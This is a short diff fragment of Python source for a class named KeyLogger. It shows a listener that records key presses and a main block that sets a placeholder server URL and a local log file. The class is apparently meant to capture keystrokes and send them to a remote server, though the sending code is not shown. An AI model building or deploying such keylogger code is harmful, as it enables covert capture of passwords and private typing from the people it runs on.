@@ -184,12 +184,14 @@ class KeyLogger:
             self.pressed_keys.remove(key)
 
     def run(self):
+
         print("Keylogger started. Press ESC to stop.\n")
+
         with Listener(on_press=self.on_key_press, on_release=self.on_key_release) as listener:
             listener.join()
 
 if __name__ == "__main__":
-    SERVER_URL = "https://fv"
+    SERVER_URL = "https://fvv"
     LOG_FILE = "a.txt"
 
     keylogger = KeyLogger(server_url=SERVER_URL, log_file=LOG_FILE)
